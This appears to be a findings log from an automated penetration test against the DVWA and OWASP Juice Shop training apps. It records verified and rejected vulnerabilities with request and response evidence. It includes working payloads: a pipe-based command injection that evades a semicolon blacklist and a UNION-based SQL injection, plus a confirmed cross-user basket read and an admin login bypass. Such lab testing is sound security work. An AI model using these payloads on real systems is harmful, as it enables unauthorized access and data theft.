findings.title: DVWA OS Command Injection via ip parameter [security=medium]
request_sequence: Control: POST /vulnerabilities/exec/ ip=127.0.0.1; whoami&Submit=Submit -> no output
findings.response_evidence: [security=medium] Page footer 'Security Level: medium'. Payload 127.0.0.1| whoami returned 'www-data' in the command output block (HTTP 200). Control payload with ';' returned no command output, consistent with the ';' blacklist.

findings.title: DVWA security.php level change is protected by an anti-CSRF token (CSRF not exploitable) [security=low]
request_sequence: POST http://dvwa/security.php security=medium&seclev_submit=Submit (no user_token, Referer=http://evil.example/attack.html) -> 302 to /security.php; GET shows 'CSRF token is incorrect', level still low
POST http://dvwa/security.php security=medium&seclev_submit=Submit&user_token=[REDACTED] (positive control) -> 302; GET shows 'Security level set to medium'
findings.response_evidence: Token-less cross-site-style POST was NOT accepted: the security level stayed 'low' and the page displayed 'CSRF token is incorrect'. The same form with the valid user_token was accepted ('Security level set to medium'), proving the anti-CSRF token is enforced at low. The CWE-352 hypothesis is not supported for this endpoint. Test only covered the missing-token case; the level was restored to low afterward.

findings.title: Unauthenticated access to user feedback with partially masked author emails
findings.response_evidence: HTTP 200 application/json without authentication, 8 records with fields UserId,id,comment,rating,createdAt,updatedAt. Author emails appear only in masked form inside comment text, e.g. '(***in@juice-sh.op)', '(***ereum@juice-sh.op)', '(***der@juice-sh.op)'; anonymous entries have UserId null and '(anonymous)'. No full email address is disclosed in the response. Unauthenticated access is confirmed, and UserId values are exposed, but the criterion requires disclosure of author email addresses (PII), which is only partially met (masked local part, domain visible). Verdict inconclusive: partial PII leakage; coordinator may decide severity (e.g., low-severity info disclosure / CWE-200 pattern) rather than full CWE-359.

findings.title: Product-Search SQL Injection (q parameter) on GET /rest/products/search
request_sequence: GET /rest/products/search?q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- (unauth) -> 200 JSON with injected row
findings.response_evidence: Benign q=apple returns normal products. Single quote q=qwert' returns HTTP 500 with SQLite error text 'SQLITE_ERROR: near "'%'": syntax error'. The 9-column UNION payload returns HTTP 200 with {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]}, i.e. attacker-chosen SELECT values are reflected in the result set. Both the SQL error and the successful UNION injection are observed, and the benign baseline is error-free.

findings.title: Login Authentication-Bypass SQL Injection via email field on POST /rest/user/login
findings.response_evidence: HTTP 200 application/json: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. A valid authentication token was issued for the first user (admin@juice-sh.op) with an arbitrary password, which meets the verification criterion.

findings.title: Cross-user basket access (BOLA) on GET /rest/basket/:id
request_sequence: GET http://juiceshop:3000/rest/basket/6 (session juiceshop_acct2, owner acct2 own_basket_id=7) -> 200
findings.response_evidence: Account 2 (acct2_bench@juiceshop.local, own_basket_id=7) received HTTP 200 for basket 6 owned by UserId 22 (acct1's basket): {"status":"success","data":{"id":6,"UserId":22,"Products":[{"id":1,"name":"Apple Juice (1000ml)","BasketItem":{"ProductId":1,"BasketId":6,"id":9,"quantity":3}}]}}. The response content is identical to what acct1 receives for its own basket, confirming no ownership check. Product: Apple Juice (1000ml), quantity 3.

findings.title: GET /rest/user/whoami unauthenticated - no sensitive disclosure observed
findings.response_evidence: HTTP 200 with body {"user":{}} for an unauthenticated request. No user identifiers, email, token, or other PII are returned, so no information disclosure is demonstrated. No suspected CWE was assigned by the Coordinator; rejected as not exploitable under the tested criteria.

findings.title: Unauthenticated product catalog listing at /api/Products (suspected CWE-200)
findings.response_evidence: HTTP 200, application/json, body {"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)","description":"The all-time classic.","price":1.99,"deluxePrice":0.99,"image":"apple_juice.jpg","createdAt":...,"updatedAt":...,"deletedAt":null}, ...]}. The returned fields are the public storefront catalog attributes only (name, description, price, deluxePrice, image, timestamps). No credentials, password hashes, emails, internal cost/supplier data, tokens, or other user-scoped secrets were present in the records observed. The unauthenticated read of the product catalog is the intended public behavior of the storefront, so no confidentiality breach is demonstrated for CWE-200. Verdict: rejected as a vulnerability; the endpoint is a legitimate public API.
